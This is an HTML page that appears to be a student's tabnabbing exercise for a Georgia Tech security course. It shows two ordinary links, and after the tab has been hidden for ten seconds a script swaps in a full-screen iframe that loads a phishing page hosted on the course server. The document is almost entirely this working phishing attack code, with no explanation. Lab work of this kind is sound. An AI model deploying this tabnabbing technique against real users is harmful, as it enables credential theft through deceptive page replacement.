<!DOCTYPE html>
<html>

<a href="https://catalog.gatech.edu/" target="_blank">Georgia Tech</a>
<a href="https://google.com" target="_blank">Google</a>     
 

<style>
html, body {
    margin: 0;
    height: 100%;
}

#loadTabnabing {
    display: none;
}

iframe {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: none;
    z-index: 9999;
    background: white;
}
</style>
<body>
<div id="loadTabnabing">
    <iframe src="https://cs6262.gtisc.gatech.edu/tabnabbing/dgarcia329/"></iframe>
</div>

<script>
let lost_focus = false;
let check_time = 0;
let counter = null;

function start_counter() {

    counter = setInterval(() => {

        if (!lost_focus) {
            clearInterval(counter);
            counter = null;
            check_time = 0;
            return;
        }

        check_time++;

        if (check_time >= 10) {
            clearInterval(counter);
            document.getElementById("loadTabnabing").style.display = "block";
        }

    }, 1000);
}

document.addEventListener("visibilitychange", function() {

    if (document.visibilityState === "hidden") {
        lost_focus = true;
        if (!counter) start_counter();
    } else {
        lost_focus = false;
    }

});
</script>
</body>
</html>
